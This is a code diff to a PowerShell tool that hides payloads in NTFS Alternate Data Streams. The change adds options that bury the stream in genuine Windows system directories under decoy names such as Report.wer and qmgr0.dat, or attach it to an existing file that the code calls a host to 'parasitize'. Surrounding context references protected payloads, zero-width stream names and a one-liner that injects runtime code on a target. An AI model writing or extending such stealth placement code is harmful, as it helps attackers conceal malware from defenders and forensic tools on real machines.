@@ -168,6 +168,11 @@ param(
     [PSCredential]$Credential,
     [switch]$Help,
     
+    # Deep placement - bury ADS in legitimate Windows subdirectories
+    [switch]$UseDeepPlacement,
+    # Attach to existing file instead of creating a new host file
+    [switch]$AttachToExisting,
+    
     [switch]$GenerateOnly
 )
 
@@ -473,32 +478,89 @@ function Unprotect-Payload {
 function Get-RandomADSConfig {
     <#
     .SYNOPSIS
-        Generates ADS configuration
+        Generates ADS configuration with optional deep directory placement
     #>
     [CmdletBinding()]
     param(
         [switch]$UseZeroWidth,
         [string]$ZwMode = 'single',
-        [string]$ZwPrefix
+        [string]$ZwPrefix,
+        [switch]$UseDeepPlacement,
+        [switch]$AttachToExisting
     )
 
-    # Cross-platform path handling
-    # On Linux (config generation): use Windows default path
-    # On Windows (actual deployment): use actual %ProgramData%
-    if ($env:ProgramData) {
-        # Running on Windows - use Join-Path normally
-        $hostPath = if ($Randomize) {
-            Join-Path $env:ProgramData (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
-        } else {
-            Join-Path $env:ProgramData "SystemCache.dat"
+    # --- Host path selection ---
+    # Deep placement and AttachToExisting are RUNTIME features.
+    # When running on Linux (GenerateOnly), we emit a placeholder path.
+    # The OneLiner injects runtime code that overrides $hp on the target.
+    # When running on Windows directly, we resolve here.
+
+    $_isWin = [bool]$env:ProgramData
+
+    if ($_isWin -and ($UseDeepPlacement -or $AttachToExisting)) {
+        # Running directly on Windows — resolve deep path now
+        $deepDirs = @(
+            "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
+            "$env:ProgramData\Microsoft\Windows\WER\Temp",
+            "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
+            "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
+            "$env:WINDIR\Temp",
+            "$env:ProgramData\Microsoft\Diagnosis",
+            "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics",
+            "$env:ProgramData\Microsoft\Network\Downloader"
+        )
+
+        $validDirs = $deepDirs | Where-Object { Test-Path $_ }
+
+        if ($AttachToExisting -and $validDirs) {
+            # Find an existing file to parasitize
+            $hostPath = $null
+            foreach ($dir in ($validDirs | Get-Random -Count ([Math]::Min(3, $validDirs.Count)))) {
+                $candidate = Get-ChildItem -Path $dir -File -ErrorAction SilentlyContinue |
+                    Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB } |
+                    Select-Object -First 10 | Get-Random
+                if ($candidate) {
+                    $hostPath = $candidate.FullName
+                    Write-Verbose "Attaching to existing file: $hostPath"
+                    break
+                }
+            }
+            # Fallback to deep placement if no suitable file found
+            if (-not $hostPath) {
+                Write-Verbose "No existing file found, falling back to deep placement"
+                $UseDeepPlacement = $true
+                $AttachToExisting = $false
+            }
         }
-    } else {
-        # Running on Linux - manually construct Windows path (Join-Path won't work with C:\)
-        if ($Randomize) {
-            $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
-            $hostPath = "C:\ProgramData\$randomName"
+
+        if ($UseDeepPlacement -and -not $hostPath) {
+            $targetDir = $validDirs | Get-Random
+            if ($targetDir) {
+                $legitNames = @('Report.wer','etl_data.log','WPR_initiated.dat',
+                                'snapshot.etl','diag_report.xml','cache_entry.dat',
+                                'qmgr0.dat','aria-debug.log','session.etl')
+                $fileName = if ($Randomize) { $legitNames | Get-Random } else { 'cache_entry.dat' }
+                $hostPath = Join-Path $targetDir $fileName
+            }
+        }
+    }
+
+    # Default / Linux fallback path
+    if (-not $hostPath) {
+        if ($env:ProgramData) {
+            $hostPath = if ($Randomize) {
+                Join-Path $env:ProgramData (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
+            } else {
+                Join-Path $env:ProgramData "SystemCache.dat"
+            }
         } else {
-            $hostPath = "C:\ProgramData\SystemCache.dat"
+            # Running on Linux — construct Windows path manually
+            if ($Randomize) {
+                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
+                $hostPath = "C:\ProgramData\$randomName"
+            } else {
+                $hostPath = "C:\ProgramData\SystemCache.dat"
+            }
         }
     }
    
@@ -679,7 +741,9 @@ if (-not $Payload) {
 # Generate config
 $config = Get-RandomADSConfig -UseZeroWidth:$ZeroWidthStreams `
                               -ZwMode $ZeroWidthMode `
-                              -ZwPrefix $HybridPrefix
+                              -ZwPrefix $HybridPrefix `
+                              -UseDeepPlacement:$UseDeepPlacement `
+                              -AttachToExisting:$AttachToExisting
 
 Write-Verbose "Host: $($config.HostPath)"
 Write-Verbose "Stream: $($config.StreamName)"
@@ -716,6 +780,8 @@ if ($GenerateOnly) {
         ZeroWidthMode = $ZeroWidthMode
         HybridPrefix = $HybridPrefix
         Randomized = $Randomize.IsPresent
+        DeepPlacement = $UseDeepPlacement.IsPresent
+        AttachToExisting = $AttachToExisting.IsPresent
     }
 }
 
